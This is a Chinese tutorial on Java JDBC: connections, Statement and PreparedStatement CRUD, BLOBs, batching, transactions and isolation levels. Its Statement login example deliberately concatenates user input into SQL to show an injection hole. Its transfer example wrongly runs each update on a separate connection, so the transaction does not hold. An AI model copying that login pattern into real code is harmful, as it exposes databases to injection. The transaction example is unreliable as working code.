介绍 JDBC(Java Database Connectivity)是一个独立于特定数据库管理系统、通用的 SQL 数据库存取和操作的公共接口（一组API），定义了用来访问数据库的标准Java类库，（java.sql,javax.sql）使用这些类库可以以一种标准的方法、方便地访问数据库资源。\nJDBC 为访问不同的数据库提供了一种统一的途径，为开发者屏蔽了一些细节问题，使Java程序员使用 JDBC 可以连接任何提供了JDBC驱动程序的数据库系统，这样就使得程序员无需对特定的数据库系统的特点有过多的了解，从而大大简化和加快了开发过程。\n3. 数据库访问方式比较 普通方式连接： 使用 JDBC 连接： 通过对比可以发现 Java 使用 JDBC 访问数据库时，程序的可移植性大大提高。因为程序是和 JDBC 进行交互的，没有和底层数据库交互。即使数据库更换了，由 JDBC 自行适应新的数据库即可，Java 程序本身完全不用关心底层数据库是否改变。\n4. JDBC 体系结构 JDBC接口（API）包括两个层次：\n面向应用的API：Java API，抽象接口，供应用程序开发人员使用（连接数据库，执行SQL语句，获得结果）； 面向数据库的API：Java Driver API，供开发商开发数据库驱动程序用。 5. JDBC 开发流程 ODBC（Open Database Connectivity，开放式数据库连接），是微软在Windows平台下推出的。使用者在程序中只需要调用ODBC API，由 ODBC 驱动程序将调用转换成为对特定的数据库的调用请求。\n二、数据库链接准备工作 1. 配置 JDBC 驱动 java.sql.Driver 接口是所有 JDBC 驱动程序需要实现的接口。这个接口是提供给数据库厂商使用的，不同数据库厂商提供不同的实现。在我们的 Java 程序中不需要直接去访问实现了 Driver 接口的类，而是由驱动程序管理器类（``java.sql.DriverManager`）去调用这些Driver实现。\n习惯上将从各大数据库官网上下载的 jar 包拷贝到 Java 工程中与 src 文件夹同级的 lib 文件夹，并将这个 jar 包添加到工程中（如果是Dynamic Web Project（动态的web项目）话，则是把驱动jar放到WebContent（有的开发工具叫 WebRoot）目录中的WEB-INF目录中的lib目录下即可）。\n2. 加载和注册 JDBC 驱动 加载驱动：加载 JDBC 驱动需调用 Class 类的静态方法 forName()，向其传递要加载的 JDBC 驱动的类名\nClass.forName(“com.mysql.jdbc.Driver”); 注册驱动：DriverManager 类是驱动程序管理器类，负责管理驱动程序\n使用DriverManager.registerDriver(com.mysql.jdbc.Driver)来注册驱动 通常不用显式调用 DriverManager 类的 registerDriver() 方法来注册驱动程序类的实例，因为 Driver 接口的驱动程序类都包含了静态代码块，在这个静态代码块中，会调用 DriverManager.registerDriver() 方法来注册自身的一个实例。 3. URL JDBC URL 用于标识一个被注册的驱动程序，驱动程序管理器通过这个 URL 选择正确的驱动程序，从而建立到数据库的连接。\nJDBC URL的标准由三部分组成，各部分间用冒号分隔：\n格式：jdbc:子协议:子名称\n协议：JDBC URL中的协议总是 jdbc ； 子协议：子协议用于标识一个数据库驱动程序； 子名称：一种标识数据库的方法。子名称可以依不同的子协议而变化，用子名称的目的是为了定位数据库提供足够的信息。包含主机名(对应服务端的ip地址)，端口号，数据库名； 示例：jdbc:mysql://localhost:3306/test\n几种常用数据库的 JDBC URL：\nMySQL：\njdbc:mysql://主机名称:mysql服务端口号/数据库名称?参数=值\u0026amp;参数=值 jdbc:mysql://localhost:3306/atguigu jdbc:mysql://localhost:3306/atguigu?useUnicode=true\u0026amp;characterEncoding=utf8（如果JDBC程序与服务器端的字符集不一致，会导致乱码，那么可以通过参数指定服务器端的字符集） jdbc:mysql://localhost:3306/atguigu?user=root\u0026amp;password=123456 Oracle 9i：\njdbc:oracle:thin:@主机名称:oracle服务端口号:数据库名称 jdbc:oracle:thin:@localhost:1521:atguigu SQLServer：\njdbc:sqlserver://主机名称:sqlserver服务端口号:DatabaseName=数据库名称 jdbc:sqlserver://localhost:1433:DatabaseName=atguigu 4. 添加用户名与密码 添加数据库用户名与密码可以通过以下两种方式进行：\nuser 和 password 可以用“属性名=属性值”方式告诉数据库； 可以调用 DriverManager 类的 getConnection() 方法建立到数据库的连接。 三、数据库连接 方式一：显式使用第三方数据库API 该方式显式使用第三方数据库的 API。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import java.sql.Connection; import java.sql.Driver; import java.sql.SQLException; import java.util.Properties; public class Demo { public static void main(String[] args) throws SQLException { try { // 1.提供java.sql.Driver接口实现类的对象 Driver driver = new com.mysql.cj.jdbc.Driver(); // 2.提供url，指明具体操作的数据库 String url = \u0026#34;jdbc:mysql://localhost:3306/demo\u0026#34;; // 3. 提供Properties对象，指明用户名和密码 Properties info = new Properties(); info.setProperty(\u0026#34;user\u0026#34;, \u0026#34;root\u0026#34;); info.setProperty(\u0026#34;password\u0026#34;, \u0026#34;123456abc\u0026#34;); // 4. 调用driver的connect获取连接 Connection conn = driver.connect(url, info); System.out.println(conn); } catch (SQLException e) { e.printStackTrace(); } } } 方式二：使用反射实例化Driver 相较于方式一，这里使用反射实例化 Driver，不在代码中体现第三方数据库的 API。体现了面向接口编程思想。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import java.sql.Connection; import java.sql.Driver; import java.sql.SQLException; import java.util.Properties; public class Demo { public static void main(String[] args) throws SQLException { try { // 1.实例化Driver String className = \u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;; Class clazz = Class.forName(className); Driver driver = (Driver) clazz.newInstance(); // 2.提供url，指明具体操作的数据库 String url = \u0026#34;jdbc:mysql://localhost:3306/demo\u0026#34;; // 3. 提供Properties对象，指明用户名和密码 Properties info = new Properties(); info.setProperty(\u0026#34;user\u0026#34;, \u0026#34;root\u0026#34;); info.setProperty(\u0026#34;password\u0026#34;, \u0026#34;123456abc\u0026#34;); // 4. 调用driver的connect获取连接 Connection conn = driver.connect(url, info); System.out.println(conn); } catch (Exception e) { e.printStackTrace(); } } } 方式三：使用DriverManager显式注册驱动 方式三使用 DriverManager 实现数据库的连接。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import java.sql.Connection; import java.sql.Driver; import java.sql.DriverManager; import java.sql.SQLException; public class Demo { public static void main(String[] args) throws SQLException { try { // 1.数据库连接基本要素 String driverName = \u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;; String url = \u0026#34;jdbc:mysql://localhost:3306/demo\u0026#34;; String user = \u0026#34;root\u0026#34;; String password = \u0026#34;123456abc\u0026#34;; // 2.实例化 Driver Class clazz = Class.forName(driverName); Driver driver = (Driver) clazz.newInstance(); // 3.注册驱动 DriverManager.registerDriver(driver); // 4.获取连接 Connection conn = DriverManager.getConnection(url, user, password); System.out.println(conn); } catch (Exception e) { e.printStackTrace(); } } } 方式四：使用DriverManager隐式注册驱动 不必显式的注册驱动了。因为在 DriverManager 的源码中已经存在静态代码块，实现了驱动的注册。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLException; public class Demo { public static void main(String[] args) throws SQLException { try { // 1.数据库连接基本要素 String driverName = \u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;; String url = \u0026#34;jdbc:mysql://localhost:3306/demo\u0026#34;; String user = \u0026#34;root\u0026#34;; String password = \u0026#34;123456abc\u0026#34;; // 2.加载驱动 Class.forName(driverName); // 3.获取连接 Connection conn = DriverManager.getConnection(url, user, password); System.out.println(conn); } catch (Exception e) { e.printStackTrace(); } } } 方式五：使用配置文件（最终版） 使用配置文件的方式保存配置信息，在代码中加载配置文件。\n使用配置文件的好处：\n实现了代码和数据的分离，如果需要修改配置信息，直接在配置文件中修改，不需要深入代码 如果修改了配置信息，省去重新编译的过程。 在 Java 程序所在文件夹下新建配置文件jdbc.properties：\n1 2 3 4 user=root password=123456abc url=jdbc:mysql://localhost:3306/demo driverClass=com.mysql.cj.jdbc.Driver 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import java.io.InputStream; import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLException; import java.util.Properties; public class Demo { public static void main(String[] args) throws SQLException { try { // 1.加载配置文件 InputStream is = Demo.class.getClassLoader().getResourceAsStream(\u0026#34;jdbc.properties\u0026#34;); Properties properties = new Properties(); properties.load(is); // 2.读取配置信息 String user = properties.getProperty(\u0026#34;user\u0026#34;); String password = properties.getProperty(\u0026#34;password\u0026#34;); String url = properties.getProperty(\u0026#34;url\u0026#34;); String driverClass = properties.getProperty(\u0026#34;driverClass\u0026#34;); // 3.加载驱动 Class.forName(driverClass); // 4.获取连接 Connection conn = DriverManager.getConnection(url, user, password); System.out.println(conn); } catch (Exception e) { e.printStackTrace(); } } } 四、使用PreparedStatement实现CRUD操作 1.操作和访问数据库 数据库连接被用于向数据库服务器发送命令和 SQL 语句，并接受数据库服务器返回的结果。其实一个数据库连接就是一个 Socket 连接。\n在java.sql包中有 3 个接口分别定义了对数据库的调用的不同方式：\nStatement：用于执行静态 SQL 语句并返回它所生成结果的对象； PrepatedStatement：SQL 语句被预编译并存储在此对象中，可以使用此对象多次高效地执行该语句； CallableStatement：用于执行 SQL 存储过程。 2.使用Statement操作数据表 数据表：\nID Name Password 1 小明 123456 通过调用 Connection 对象的 createStatement() 方法创建该对象。该对象用于执行静态的 SQL 语句，并且返回执行结果。Statement 接口中定义了下列方法用于执行 SQL 语句：\nint excuteUpdate(String sql)：执行更新操作 INSERT、UPDATE、DELETE； ResultSet executeQuery(String sql)：执行查询操作 SELECT。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 import java.io.InputStream; import java.lang.reflect.Field; import java.sql.*; import java.util.Properties; import java.util.Scanner; public class Demo { public static void main(String[] args) throws SQLException { Scanner scan = new Scanner(System.in); System.out.print(\u0026#34;用户名：\u0026#34;); String userName = scan.nextLine(); System.out.print(\u0026#34;密 码：\u0026#34;); String password = scan.nextLine(); String sql = \u0026#34;SELECT name,password FROM user WHERE Name = \u0026#39;\u0026#34; + userName + \u0026#34;\u0026#39; AND PASSWORD = \u0026#39;\u0026#34; + password + \u0026#34;\u0026#39;\u0026#34;; User user = get(sql, User.class); if (user != null) { System.out.println(\u0026#34;登陆成功!\u0026#34;); } else { System.out.println(\u0026#34;用户名或密码错误！\u0026#34;); } } public static \u0026lt;T\u0026gt; T get(String sql, Class\u0026lt;T\u0026gt; clazz) { T t = null; Connection conn = null; Statement st = null; ResultSet rs = null; try { // 1.加载配置文件 InputStream is = Demo.class.getClassLoader().getResourceAsStream(\u0026#34;jdbc.properties\u0026#34;); Properties properties = new Properties(); properties.load(is); // 2.读取配置信息 String user = properties.getProperty(\u0026#34;user\u0026#34;); String password = properties.getProperty(\u0026#34;password\u0026#34;); String url = properties.getProperty(\u0026#34;url\u0026#34;); String driverClass = properties.getProperty(\u0026#34;driverClass\u0026#34;); // 3.加载驱动 Class.forName(driverClass); // 4.获取连接 conn = DriverManager.getConnection(url, user, password); st = conn.createStatement(); rs = st.executeQuery(sql); // 获取结果集的元数据 ResultSetMetaData rsmd = rs.getMetaData(); // 获取结果集的列数 int columnCount = rsmd.getColumnCount(); if (rs.next()) { t = clazz.newInstance(); for(int i=0 ; i \u0026lt; columnCount ; i++) { // 获取列的名称 // String columnName = rsmd.getColumnName(i+1); // 1.获取列的别名 String columnName = rsmd.getColumnLabel(i + 1); // 2.根据列名获取对应数据表中的数据 Object columnVal = rs.getObject(columnName); // 3.将数据表中得到的数据，封装进对象 Field field = clazz.getDeclaredField(columnName); field.setAccessible(true); field.set(t,columnVal); } return t; } } catch (Exception e) { e.printStackTrace(); } finally { // 关闭资源 if (rs != null) { try { rs.close(); } catch (SQLException e) { e.printStackTrace(); } } if (st != null) { try { st.close(); } catch (SQLException e) { e.printStackTrace(); } } if (conn != null) { try { conn.close(); } catch (SQLException e) { e.printStackTrace(); } } } return null; } } class User { private String name; private String password; public User() { } public User(String name, String password) { this.name = name; this.password = password; } @Override public String toString() { return \u0026#34;User{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, password=\u0026#39;\u0026#34; + password + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } 但是使用Statement操作数据表存在弊端：\n存在拼串操作，操作较为繁琐； 存在SQL注入问题。 3. 使用PreparedStatement操作数据表 在 Java 程序中我们可以通过调用 Connection 对象的 preparedStatement(String sql) 方法获取 PreparedStatement 对象。\nPreparedStatement 接口是 Statement 的子接口，它表示一条预编译过的 SQL 语句。PreparedStatement 对象所代表的 SQL 语句中的参数用问号 (?) 来表示，调用 PreparedStatement 对象的 setXxx() 方法来设置这些参数。setXxx() 方法有两个参数，第一个参数是要设置的 SQL 语句中的参数的索引(从 1 开始)，第二个是设置的 SQL 语句中的参数的值。\nPreparedStatement 的主要特点：\n代码的可读性和可维护性较高；\nPreparedStatement 能最大可能提高性能：\nDBServer 会对预编译语句提供性能优化。因为预编译语句有可能被重复调用，所以语句在被 DBServer 的编译器编译后的执行代码被缓存下来，那么下次调用时只要是相同的预编译语句就不需要编译，只要将参数直接传入编译过的语句执行代码中就会得到执行。 在 statement 语句中,即使是相同操作但因为数据内容不一样,所以整个语句本身不能匹配,没有缓存语句的意义.事实是没有数据库会对普通语句编译后的执行代码缓存。这样每执行一次都要对传入的语句编译一次。 PreparedStatement 可以防止 SQL 注入 。\nJava与SQL对应数据类型转换表：\nJava类型 SQL类型 boolean BIT byte TINYINT short SMALLINT int INTEGER long BIGINT String CHAR,VARCHAR,LONGVARCHAR byte array BINARY , VAR BINARY java.sql.Date DATE java.sql.Time TIME java.sql.Timestamp TIMESTAMP 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 import java.io.InputStream; import java.lang.reflect.Field; import java.sql.*; import java.util.Properties; public class Demo { public static void main(String[] args) { String sql; sql = \u0026#34;insert into user values (default, ?, ?)\u0026#34;; DBUtils.update(sql, \u0026#34;小刚\u0026#34;, 123456); sql = \u0026#34;select name,password from user where name=\u0026#39;小刚\u0026#39;\u0026#34;; System.out.println(DBUtils.getInstance(sql, User.class)); } } /*****************************************************************************/ /*************************** User 类 ***************************************/ /*****************************************************************************/ class User { private String name; private String password; public User() { } public User(String name, String password) { this.name = name; this.password = password; } @Override public String toString() { return \u0026#34;User{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, password=\u0026#39;\u0026#34; + password + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#39;}\u0026#39;; } } /*****************************************************************************/ /*********************** DBUtils 数据库工具类 ********************************/ /*****************************************************************************/ class DBUtils { public static Connection getConnection() throws Exception { Connection conn = null; Statement st = null; ResultSet rs = null; try { // 1.加载配置文件 InputStream is = ClassLoader.getSystemClassLoader().getResourceAsStream(\u0026#34;jdbc.properties\u0026#34;); Properties properties = new Properties(); properties.load(is); // 2.读取配置信息 String user = properties.getProperty(\u0026#34;user\u0026#34;); String password = properties.getProperty(\u0026#34;password\u0026#34;); String url = properties.getProperty(\u0026#34;url\u0026#34;); String driverClass = properties.getProperty(\u0026#34;driverClass\u0026#34;); // 3.加载驱动 Class.forName(driverClass); // 4.获取连接 conn = DriverManager.getConnection(url, user, password); return conn; } catch (Exception e) { e.printStackTrace(); } return null; } public static void closeResource(Connection conn, PreparedStatement ps) { // 关闭资源 if (conn != null) { try { conn.close(); } catch (SQLException e) { e.printStackTrace(); } } if (ps != null) { try { ps.close(); } catch (SQLException e) { e.printStackTrace(); } } } public static \u0026lt;T\u0026gt; T getInstance(String sql, Class\u0026lt;T\u0026gt; clazz, Object... args) { /* * 查询数据库 * */ Connection conn = null; PreparedStatement ps = null; ResultSet rs = null; try { // 1.获取数据库连接 conn = DBUtils.getConnection(); // 2.预编译sql语句，得到PreparedStatement对象 if (conn != null) { ps = conn.prepareStatement(sql); // 3.填充占位符 for (int i = 0; i \u0026lt; args.length; i++) { ps.setObject(i + 1, args[i]); } // 4.执行sql语句得到结果集 rs = ps.executeQuery(); // 5.得到结果集的元数据：ResultSetMetaData ResultSetMetaData rsmd = rs.getMetaData(); // 6.通过ResultSetMetaData得到columnCount,columnLabel；通过ResultSet得到列值 int columnCount = rsmd.getColumnCount(); if (rs.next()) { T t = clazz.newInstance(); for (int i = 0; i \u0026lt; columnCount; i++) {// 遍历每一个列 // 获取列值 Object columnVal = rs.getObject(i + 1); // 获取列的别名:列的别名，使用类的属性名充当 String columnLabel = rsmd.getColumnLabel(i + 1); // 6.2使用反射，给对象的相应属性赋值 Field field = clazz.getDeclaredField(columnLabel); field.setAccessible(true); field.set(t, columnVal); } return t; } } } catch (Exception throwables) { throwables.printStackTrace(); } finally { DBUtils.closeResource(conn, ps); } return null; } public static void update(String sql, Object... args) { /* * 更新数据库 * */ Connection conn = null; PreparedStatement ps = null; try { // 1.获取数据库连接 conn = DBUtils.getConnection(); // 2.获取PreparedStatement的实例 (或：预编译sql语句) if (conn != null) { ps = conn.prepareStatement(sql); // 3.填充占位符 for (int i = 0; i \u0026lt; args.length; i++) { ps.setObject(i + 1, args[i]); } //4.执行sql语句 ps.execute(); } } catch (Exception e) { e.printStackTrace(); } finally { DBUtils.closeResource(conn, ps); } } } 4、ResultSet与ResultSetMetaData ResultSet 查询需要调用PreparedStatement 的 executeQuery() 方法，查询结果是一个ResultSet 对象。ResultSet 对象以逻辑表格的形式封装了执行数据库操作的结果集，ResultSet 接口由数据库厂商提供实现。\nResultSet 返回的实际上就是一张数据表。有一个指针指向数据表的第一条记录的前面。它维护了一个指向当前数据行的游标，初始的时候，游标在第一行之前，可以通过 ResultSet 对象的 next() 方法移动到下一行。调用 next()方法检测下一行是否有效。若有效，该方法返回 true，且指针下移。相当于Iterator对象的 hasNext() 和 next() 方法的结合体。\n注意：Java与数据库交互涉及到的相关Java API中的索引都从1开始。\nResultSetMetaData ResultSetMetaData 可用于获取关于 ResultSet 对象中列的类型和属性信息的对象\nResultSetMetaData meta = rs.getMetaData();\nResultSetMetaData 常用方法：\ngetColumnName(int column)：获取指定列的名称；\ngetColumnLabel(int column)：获取指定列的别名；\ngetColumnCount()：返回当前 ResultSet 对象中的列数；\ngetColumnTypeName(int column)：检索指定列的数据库特定的类型名称；\ngetColumnDisplaySize(int column)：指示指定列的最大标准宽度，以字符为单位；\nisNullable(int column)：指示指定列中的值是否可以为 null；\nisAutoIncrement(int column)：指示是否自动为指定列进行编号，这样这些列仍然是只读的。\n5. ORM思想 对象关系映射（英语：Object Relational Mapping，简称ORM，或O/RM，或O/R mapping），是一种程序设计技术，用于实现面向对象编程语言里不同类型系统的资料之间的转换。从效果上说，它其实是创建了一个可在编程语言里使用的“虚拟对象数据库”。\n五、操作BLOB类型字段 1. MySQL BLOB类型 在 MySQL中，BLOB是一个二进制大型对象，是一个可以存储大量数据的容器，它能容纳不同大小的数据。\n使用 Java 程序插入BLOB类型的数据必须使用PreparedStatement，因为BLOB类型的数据无法使用字符串拼接写的。\nMySQL的四种BLOB类型(除了在存储的最大信息量上不同外，他们是等同的)：\n注意：\n实际使用中根据需要存入的数据大小定义不同的 BLOB 类型； 如果存储的文件过大，数据库的性能会下降； 如果在指定了相关的Blob类型以后，还报错：xxx too large，那么在mysql的安装目录下，找my.ini文件加上如下的配置参数： max_allowed_packet=16M。同时注意：修改了my.ini文件之后，需要重新启动mysql服务。 2. 插入 BLOB 类型 1 2 3 String sql; sql = \u0026#34;insert into user values (default, ?, ?, ?)\u0026#34;; DBUtils.update(sql, \u0026#34;小刚\u0026#34;, 123456, new FileInputStream(\u0026#34;java.png\u0026#34;)); // 剩余代码查看4.3 3. 从数据表中读取大数据类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 String sql; PreparedStatement ps; sql = \u0026#34;select * from user where name=\u0026#39;小刚\u0026#39;\u0026#34;; Connection conn = DBUtils.getConnection(); if (conn != null) { ps = conn.prepareStatement(sql); ResultSet rs = ps.executeQuery(); if (rs.next()) { Blob photo = rs.getBlob(4); InputStream is = photo.getBinaryStream(); OutputStream os = new FileOutputStream(\u0026#34;photo.jpg\u0026#34;); byte[] buffer = new byte[1024]; int len=0; while ((len = is.read(buffer)) != -1) { os.write(buffer, 0, len); } DBUtils.closeResource(conn, ps); rs.close(); is.close(); os.close(); } } 六、批量插入 当需要成批插入或者更新记录时，可以采用 Java 的批量更新机制，这一机制允许多条语句一次性提交给数据库批量处理。通常情况下比单独提交处理更有效率\nJDBC的批量处理语句包括下面三个方法：\naddBatch(String)：添加需要批量处理的SQL语句或是参数； executeBatch()：执行批量处理语句； clearBatch():清空缓存的数据 通常我们会遇到两种批量执行SQL语句的情况：\n多条 SQL 语句的批量处理； 一个 SQL 语句的批量传参。 在数据库中创建数据表 1 2 3 4 CREATE TABLE goods( id INT PRIMARY KEY AUTO_INCREMENT, NAME VARCHAR(20) ); 我们下面使用不同的方式一步一步优化向该数据表中插入两千条数据。\n层次一：使用Statement 1 2 3 4 5 6 7 8 9 10 11 12 long startTime=System.currentTimeMillis(); //获取开始时间 Connection conn = DBUtils.getConnection(); Statement st = conn.createStatement(); for(int i = 1;i \u0026lt;= 2000;i++){ String sql = \u0026#34;insert into goods values(default, \u0026#39;name_\u0026#34;+ i +\u0026#34;\u0026#39;)\u0026#34;; st.executeUpdate(sql); } conn.close(); long endTime = System.currentTimeMillis(); //获取结束时间 System.out.println(\u0026#34;程序运行时间： \u0026#34;+ (endTime - startTime)+\u0026#34;ms\u0026#34;); // 76255ms 层次二：使用PreparedStatement 1 2 3 4 5 6 7 8 9 10 11 12 13 long startTime=System.currentTimeMillis(); //获取开始时间 Connection conn = DBUtils.getConnection(); String sql = \u0026#34;insert into goods values(default, ?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 2000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); ps.executeUpdate(); } DBUtils.closeResource(conn, ps); long endTime = System.currentTimeMillis(); //获取结束时间 System.out.println(\u0026#34;程序运行时间： \u0026#34;+ (endTime - startTime)+\u0026#34;ms\u0026#34;); // 62970ms 层次三：使用PreparedStatement的Batch 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* * 1. 使用 addBatch() / executeBatch() / clearBatch() * 2. mysql服务器默认是关闭批处理的，我们需要通过一个参数，让mysql开启批处理的支持。 * ?rewriteBatchedStatements=true 写在配置文件的url后面 * */ long startTime=System.currentTimeMillis(); //获取开始时间 Connection conn = DBUtils.getConnection(); String sql = \u0026#34;insert into goods values(default, ?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 2000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); //1.“攒”sql ps.addBatch(); if(i % 500 == 0){ //2.执行 ps.executeBatch(); //3.清空 ps.clearBatch(); } } DBUtils.closeResource(conn, ps); long endTime = System.currentTimeMillis(); //获取结束时间 System.out.println(\u0026#34;程序运行时间： \u0026#34;+ (endTime - startTime)+\u0026#34;ms\u0026#34;); // 1720ms 层次四：关闭Connection的自动提交 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 /* * 使用Connection 的 setAutoCommit(false) / commit() * */ long startTime=System.currentTimeMillis(); //获取开始时间 Connection conn = DBUtils.getConnection(); //1.设置为不自动提交数据 conn.setAutoCommit(false); String sql = \u0026#34;insert into goods values(default, ?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 2000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); //1.“攒”sql ps.addBatch(); if(i % 500 == 0){ //2.执行 ps.executeBatch(); //3.清空 ps.clearBatch(); } } //2.提交数据 conn.commit(); DBUtils.closeResource(conn, ps); long endTime = System.currentTimeMillis(); //获取结束时间 System.out.println(\u0026#34;程序运行时间： \u0026#34;+ (endTime - startTime)+\u0026#34;ms\u0026#34;); // 1692ms 七、事务 1. 数据库事务介绍 事务：一组逻辑操作单元,使数据从一种状态变换到另一种状态。\n事务处理（事务操作）：保证所有事务都作为一个工作单元来执行，即使出现了故障，都不能改变这种执行方式。当在一个事务中执行多个操作时，要么所有的事务都被提交(commit)，那么这些修改就永久地保存下来；要么数据库管理系统将放弃所作的所有修改，整个事务**回滚(rollback)**到最初状态。\n为确保数据库中数据的一致性，数据的操纵应当是离散的成组的逻辑单元：当它全部完成时，数据的一致性可以保持，而当这个单元中的一部分操作失败，整个事务应全部视为错误，所有从起始点以后的操作应全部回退到开始状态。\n2. JDBC事务处理 数据一旦提交，就不可回滚。\n数据什么时候意味着提交？\n当一个连接对象被创建时，默认情况下是自动提交事务：每次执行一个 SQL 语句时，如果执行成功，就会向数据库自动提交，而不能回滚。 **关闭数据库连接，数据就会自动的提交。**如果多个操作，每个操作使用的是自己单独的连接，则无法保证事务。即同一个事务的多个操作必须在同一个连接下。 JDBC程序中为了让多个 SQL 语句作为一个事务执行：\n调用 Connection 对象的 setAutoCommit(false); 以取消自动提交事务 在所有的 SQL 语句都成功执行后，调用 commit(); 方法提交事务 在出现异常时，调用 rollback(); 方法回滚事务 若此时 Connection 没有被关闭，还可能被重复使用，则需要恢复其自动提交状态 setAutoCommit(true)。尤其是在使用数据库连接池技术时，执行close()方法前，建议恢复自动提交状态。\n示例：模拟用户小红向小明转钱\n创建数据表\n1 2 3 4 5 6 7 8 9 10 create table if not exists user ( id int auto_increment primary key, name varchar(20) null, balance int null ); INSERT INTO demo.user (id, name, balance) VALUES (1, \u0026#39;小明\u0026#39;, 100); INSERT INTO demo.user (id, name, balance) VALUES (2, \u0026#39;小红\u0026#39;, 100); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 Connection conn = null; try { // 1.获取数据库连接 conn = DBUtils.getConnection(); // 2.开启事务 conn.setAutoCommit(false); String sql; sql = \u0026#34;update user set balance = balance - 100 where name = ?\u0026#34;; DBUtils.update(sql, \u0026#34;小红\u0026#34;); // 模拟网络异常 //System.out.println(10 / 0); sql = \u0026#34;update user set balance = balance + 100 where name = ?\u0026#34;; DBUtils.update(sql, \u0026#34;小明\u0026#34;); conn.commit(); } catch (Exception e) { e.printStackTrace(); // 5.若有异常，则回滚事务 try { conn.rollback(); } catch (SQLException e1) { e1.printStackTrace(); } } finally { try { //6.恢复每次DML操作的自动提交功能 conn.setAutoCommit(true); } catch (SQLException e) { e.printStackTrace(); } //7.关闭连接 conn.close(); } 3. 事务的ACID属性 原子性（Atomicity） 原子性是指事务是一个不可分割的工作单位，事务中的操作要么都发生，要么都不发生。\n一致性（Consistency） 事务必须使数据库从一个一致性状态变换到另外一个一致性状态。\n隔离性（Isolation） 事务的隔离性是指一个事务的执行不能被其他事务干扰，即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。\n持久性（Durability） 持久性是指一个事务一旦被提交，它对数据库中数据的改变就是永久性的，接下来的其他操作和数据库故障不应该对其有任何影响。\n5. 数据库的并发问题 对于同时运行的多个事务, 当这些事务访问数据库中相同的数据时，如果没有采取必要的隔离机制，就会导致各种并发问题:\n脏读: 对于两个事务 T1, T2, T1 读取了已经被 T2 更新但还没有被提交的字段。之后, 若 T2 回滚, T1读取的内容就是临时且无效的；\n不可重复读: 对于两个事务T1, T2, T1 读取了一个字段, 然后 T2 更新了该字段。之后, T1再次读取同一个字段, 值就不同了；\n幻读: 对于两个事务T1, T2, T1 从一个表中读取了一个字段, 然后 T2 在该表中插入了一些新的行。之后, 如果 T1 再次读取同一个表, 就会多出几行；\n数据库事务的隔离性: 数据库系统必须具有隔离并发运行各个事务的能力, 使它们不会相互影响, 避免各种并发问题。\n一个事务与其他事务隔离的程度称为隔离级别。数据库规定了多种事务隔离级别, 不同隔离级别对应不同的干扰程度, 隔离级别越高, 数据一致性就越好, 但并发性越弱。\n6. 四种隔离级别 数据库提供的4种事务隔离级别：\nOracle 支持的 2 种事务隔离级别：READ COMMITED, SERIALIZABLE。 Oracle 默认的事务隔离级别为: READ COMMITED 。\nMysql 支持 4 种事务隔离级别。Mysql 默认的事务隔离级别为: REPEATABLE READ。\n7. MySQL8 查看和设置隔离级别 每启动一个 MySQL 程序, 就会获得一个单独的数据库连接. 每个数据库连接都有一个全局变量 transaction_isolation 表示当前的事务隔离级别。\n查看当前的隔离级别:\n1 select @@global.transaction_isolation, @@transaction_isolation; 修改全局隔离级别为读提交：\n1 SET GLOBAL TRANSACTION ISOLATION LEVEL READ COMMITTED; 修改会话隔离级别:\n1 SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED; 